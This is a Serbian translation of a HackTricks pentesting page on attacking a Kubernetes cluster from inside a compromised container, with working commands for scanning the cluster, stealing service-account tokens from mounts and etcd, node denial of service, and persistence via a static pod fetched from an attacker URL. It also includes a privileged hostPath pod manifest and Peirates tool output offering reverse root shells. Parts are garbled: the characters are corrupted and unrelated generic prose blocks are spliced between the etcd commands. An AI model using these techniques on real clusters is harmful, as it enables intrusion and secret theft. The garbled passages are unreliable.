# Napad na Kubernetes iznutra kontejnera

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Izlazak iz kontejnera**

**Ako imate dovoljno sre캖e, mo쬯a 캖ete mo캖i da pobegnete iz njega na 캜vor:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Bekstvo iz kontejnera

Da biste poku코ali da pobegnete iz kontejnera, mo쬯a 캖ete prvo morati da **dignete privilegije**, neke tehnike za to su:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Mo쬰te proveriti ove **docker bekstva da biste poku코ali da pobegnete** iz kontejnera koji ste kompromitovali:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Zloupotreba Kubernetes privilegija

Kao 코to je obja코njeno u delu o **enumeraciji kubernetes-a**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Obi캜no se kontejneri pokre캖u sa **tokenom servisnog naloga** unutar njih. Ovaj servisni nalog mo쬰 imati neke **privilegije pridru쬰ne** koje biste mogli **zloupotrebiti** da biste se **pomerili** ka drugim kontejnerima ili 캜ak da **pobegnete** na 캜vorove konfigurisane unutar klastera. Pogledajte kako u:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Zloupotreba Cloud privilegija

Ako se kontejner pokre캖e unutar **oblak okru쬰nja**, mo쬯a 캖ete mo캖i da **procurete token sa metapodatkovnog endpointa** i dignete privilegije koriste캖i ga.

## Pretraga ranjivih mre쬹ih servisa

Kako ste unutar Kubernetes okru쬰nja, ako ne mo쬰te da dignete privilegije zloupotrebom trenutnih privilegija kontejnera i ne mo쬰te da pobegnete iz kontejnera, trebalo bi da **pretra쬴te potencijalno ranjive servise.**

### Servisi

**Za tu svrhu, mo쬰te poku코ati da dobijete sve servise Kubernetes okru쬰nja:**
```
kubectl get svc --all-namespaces
```
Podrazumevano, Kubernetes koristi ravnu mre쬹u 코emu, 코to zna캜i da **bilo koji pod/servis unutar klastera mo쬰 komunicirati sa drugima**. **Prostori imena** unutar klastera **podrazumevano nemaju ograni캜enja mre쬹e sigurnosti**. Bilo ko u prostoru imena mo쬰 komunicirati sa drugim prostorima imena.

### Skeniranje

Slede캖i Bash skript (preuzet sa [Kubernetes radionice](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) 캖e instalirati i skenirati IP opsege kubernetes klastera:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Pogledajte slede캖u stranicu da biste saznali kako biste mogli **napasti specifi캜ne usluge Kubernetes-a** da biste **ugrozili druge podove/ceo okru쬰nje**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Snifovanje

U slu캜aju da **kompromitovani pod pokre캖e neku osetljivu uslugu** gde drugi podovi treba da se autentifikuju, mo쬯a 캖ete mo캖i da dobijete pristupnim podacima poslatim iz drugih podova **snifovanjem lokalnih komunikacija**.

## Mre쬹o falsifikovanje

Podrazumevano, tehnike poput **ARP falsifikovanja** (i zahvaljuju캖i tome **DNS falsifikovanje**) funkcioni코u u Kubernetes mre쬴. Zatim, unutar poda, ako imate **NET\_RAW sposobnost** (koja je podrazumevano dostupna), mo캖i 캖ete da 코aljete prilago캠ene mre쬹e pakete i izvodite **MitM napade putem ARP falsifikovanja na sve podove koji se izvr코avaju na istom 캜voru.**\
Osim toga, ako **zlonamerni pod** radi na **istom 캜voru kao DNS server**, mo캖i 캖ete da izvedete **DNS falsifikovanje napad na sve podove u klasteru**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Ne postoji specifikacija resursa u manifestima Kubernetes-a i **nema primenjenih granica za limite** kontejnera. Kao napada캜, mo쬰mo **iskoristiti sve resurse gde se pokre캖e pod/deployment** i iscrpiti druge resurse i izazvati DoS za okru쬰nje.

Ovo se mo쬰 uraditi pomo캖u alata poput [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Mo쬰te primetiti razliku dok se izvr코ava `stress-ng` i nakon toga
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-eksploatacija 캜vora

Ako ste uspeli da **pobegnete iz kontejnera**, prona캖i 캖ete neke zanimljive stvari u 캜voru:

- Proces **Container Runtime** (Docker)
- Vi코e **pods/kontejnera** koji se izvr코avaju u 캜voru koje mo쬰te zloupotrebiti poput ovog (vi코e tokena)
- Ceo **fajl sistem** i **OS** uop코teno
- Servis **Kube-Proxy** koji oslu코kuje
- Servis **Kubelet** koji oslu코kuje. Proverite konfiguracione fajlove:
  - Direktorijum: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Ostali **uobi캜ajeni fajlovi kubernetesa**:
  - `$HOME/.kube/config` - **Korisni캜ka konfiguracija**
  - `/etc/kubernetes/kubelet.conf` - **Redovna konfiguracija**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap konfiguracija**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd Konfiguracija**
  - `/etc/kubernetes/pki` - **Klju캜evi Kubernetesa**

### Pronala쬰nje kubeconfig fajla 캜vora

Ako ne mo쬰te prona캖i kubeconfig fajl u jednom od prethodno navedenih putanja, **proverite argument `--kubeconfig` procesa kubeleta**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Ukradi Tajne
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skripta [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatski 캖e **dobiti tokene drugih podova i proveriti da li imaju dozvole** koje tra쬴te (umesto da sami tra쬴te jedan po jedan):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privilegovani DaemonSetovi

DaemonSet je **pod** koji 캖e se **izvr코avati** na **svim 캜vorovima klastera**. Stoga, ako je DaemonSet konfigurisan sa **privilegovanim servisnim nalogom**, na **SVIM 캜vorovima** mo캖i 캖ete prona캖i **token** tog **privilegovanog servisnog naloga** koji biste mogli zloupotrebiti.

Eksploatacija je ista kao u prethodnom odeljku, ali sada ne zavisi od sre캖e.

### Pivoting ka Oblaku

Ako je klaster upravljan uslugom u oblaku, obi캜no 캖e **캜vor imati druga캜iji pristup metapodacima** nego Pod. Stoga, poku코ajte **pristupiti metapodacima sa 캜vora** (ili iz poda sa hostNetwork na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Ukradi etcd

Ako mo쬰te specificirati [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) 캜vora koji 캖e pokrenuti kontejner, dobijte shell unutar 캜vora kontrolne ravni i preuzmite **etcd bazu podataka**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane 캜vorovi imaju **ulogu master** i u **upravljanim cloud klasterima ne캖ete mo캖i pokrenuti ni코ta na njima**.

#### 캛itanje tajni iz etcd

Ako mo쬰te pokrenuti svoj pod na control-plane 캜voru koriste캖i selektor `nodeName` u specifikaciji poda, mo쬯a 캖ete imati jednostavan pristup `etcd` bazi podataka, koja sadr쬴 sve konfiguracije klastera, uklju캜uju캖i sve tajne.

Ispod je brz i prljav na캜in za dobijanje tajni iz `etcd` ako se pokre캖e na control-plane 캜voru na kojem se nalazite. Ako 쬰lite elegantnije re코enje koje pokre캖e pod sa `etcd` klijentskim alatom `etcdctl` i koristi akreditive control-plane 캜vora za povezivanje sa etcd gde god se pokre캖e, pogledajte [ovaj primer manifesta](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Proverite da li se `etcd` pokre캖e na control-plane 캜voru i vidite gde se baza podataka nalazi (Ovo je na `kubeadm` kreiranom klasteru)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```md
## Napad na Kubernetes iznutra kontejnera

Kada ste jednom unutar kontejnera u Kubernetes klasteru, postoji nekoliko tehnika koje mo쬰te koristiti da istra쬴te i potencijalno napadnete sam klaster.

### 1. Pristup API serveru

Kontejneri u istom klasteru mogu komunicirati sa API serverom bez potrebe za autentikacijom. Mo쬰te iskoristiti ovo da pristupite API serveru i izvr코ite razli캜ite akcije.

### 2. Kori코캖enje servisnog naloga

Ako kontejner ima privilegije da pristupi servisnom nalogu u klasteru, mo쬰te iskoristiti ovo da pristupite drugim resursima u klasteru.

### 3. Istra쬴vanje drugih kontejnera

Mo쬰te istra쬴vati druge kontejnere u istom klasteru kako biste prona코li potencijalne ranjivosti ili informacije koje vam mogu pomo캖i u napadu.

### 4. Kori코캖enje alata za ispitivanje

Mo쬰te koristiti alate poput `kubectl` ili `kubelet` da istra쬴te klaster, pristupite resursima i izvr코ite komande unutar klastera.

### 5. Istra쬴vanje konfiguracija

Prou캜avanjem konfiguracija kontejnera i drugih resursa u klasteru mo쬰te prona캖i slabosti ili propuste u konfiguraciji koje mo쬰te iskoristiti za napad.

Budite oprezni prilikom izvo캠enja ovih tehnika, jer neovla코캖eni pristup i manipulacija resursima u Kubernetes klasteru mo쬰 imati ozbiljne posledice.
```
```bash
data-dir=/var/lib/etcd
```
**Pregledajte podatke u etcd bazi podataka:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Izvucite tokene iz baze podataka i prika쬴te ime servisnog naloga**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Ista komanda, ali sa dodatim grep-ovima kako bi se vratili samo podaci o podrazumevanom token-u u kube-system namespace-u**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```md
## Napad na Kubernetes iznutra kontejnera

Kada ste jednom unutar kontejnera u Kubernetes klasteru, postoji nekoliko tehnika koje mo쬰te koristiti da pro코irite svoj pristup i istra쬴te klaster dalje.

### 1. Kori코캖enje API servera

Mo쬰te poku코ati da pristupite API serveru klastera iznutra kontejnera. To mo쬰 biti postignuto kori코캖enjem alata kao 코to su `curl` ili `kubectl` unutar kontejnera.

### 2. Kori코캖enje servisnog naloga

Ako kontejner ima privilegovan servisni nalog, mo쬰te iskoristiti ovu privilegiju da pristupite drugim delovima klastera ili da izvr코avate komande sa ve캖im privilegijama.

### 3. Montiranje fajl sistema

Montiranje fajl sistema iz host ma코ine u kontejner mo쬰 vam omogu캖iti pristup osetljivim fajlovima ili konfiguracionim podacima klastera.

### 4. Kori코캖enje alata za otkrivanje

Kori코캖enje alata za otkrivanje ranjivosti mo쬰 vam pomo캖i da identifikujete slabosti u konfiguraciji klastera ili da prona캠ete na캜ine za eskalaciju privilegija.

### 5. Istra쬴vanje mre쬹e komunikacije

Analiziranje mre쬹e komunikacije unutar klastera mo쬰 vam pomo캖i da identifikujete ranjivosti ili da prona캠ete na캜ine za presretanje podataka.

Kada ste unutar kontejnera, va쬹o je pa쬷jivo istra쬴ti okolinu i koristiti ove tehnike sa oprezom kako biste izbegli otkrivanje i o코te캖enje klastera.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Stati캜ka/Reflektovana Perzistencija Podova

_Stati캜ki Podovi_ se upravljaju direktno od strane kubelet demona na odre캠enom 캜voru, bez nadgledanja API servera. Za razliku od Podova koji su upravljani od strane kontrolne ravni (na primer, Deployment); umesto toga, **kubelet posmatra svaki stati캜ki Pod** (i ponovo ga pokre캖e ako ne uspe).

Stoga, stati캜ki Podovi su uvek **vezani za jedan Kubelet** na odre캠enom 캜voru.

**Kubelet automatski poku코ava da kreira reflektovani Pod na Kubernetes API serveru** za svaki stati캜ki Pod. To zna캜i da su Podovi koji se izvr코avaju na 캜voru vidljivi na API serveru, ali ih ne mo쬰te kontrolisati odatle. Imena Podova 캖e biti sufiksirana sa imenom 캜vora sa vode캖im crticom.

{% hint style="danger" %}
**`spec` stati캜kog Pod-a ne mo쬰 se odnositi na druge API objekte** (npr. ServiceAccount, ConfigMap, Secret, itd. Dakle, **ne mo쬰te zloupotrebiti ovu pona코anje da biste pokrenuli pod sa proizvoljnim serviceAccount-om** na trenutnom 캜voru kako biste ugrozili klaster. Ali to mo쬰te koristiti da biste pokrenuli podove u razli캜itim namespace-ovima (ako je to korisno iz nekog razloga).
{% endhint %}

Ako se nalazite unutar 캜vora, mo쬰te ga naterati da kreira **stati캜ki pod unutar samog sebe**. Ovo je prili캜no korisno jer vam mo쬰 omogu캖iti da **kreirate pod u drugom namespace-u** poput **kube-system**.

Da biste kreirali stati캜ki pod, [**dokumentacija je od velike pomo캖i**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). U osnovi vam je potrebno 2 stvari:

* Konfiguri코ite parametar **`--pod-manifest-path=/etc/kubernetes/manifests`** u **kubelet servisu**, ili u **kubelet konfiguraciji** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i restartujte servis
* Kreirajte definiciju na **definiciji poda** u **`/etc/kubernetes/manifests`**

**Jo코 jedan diskretniji na캜in bi bio:**

* Modifikujte parametar **`staticPodURL`** iz **kubelet** konfiguracione datoteke i postavite ne코to poput `staticPodURL: http://napadac.com:8765/pod.yaml`. To 캖e naterati kubelet proces da kreira **stati캜ki pod** dobijaju캖i **konfiguraciju sa nazna캜enog URL-a**.

**Primer** konfiguracije **poda** za kreiranje privilegovanog poda u **kube-system** preuzet sa [**ovde**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Brisanje podova + 캜vorova koji nisu u mogu캖nosti da se izvr코e

Ako je napada캜 **kompromitovao 캜vor** i mo쬰 **brisati podove** sa drugih 캜vorova i **onemogu캖iti druge 캜vorove da izvr코e podove**, podovi 캖e biti ponovo pokrenuti na kompromitovanom 캜voru i on 캖e mo캖i **ukrasti token** koji se izvr코ava u njima.\
Za [**vi코e informacija pratite ove linkove**](zloupotreba-uloga-clusterroles-u-kubernetesu/#brisanje-podova-+-캜vorova-koji-nisu-u-mogu캖nosti-da-se-izvr코e).

## Automatski Alati

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
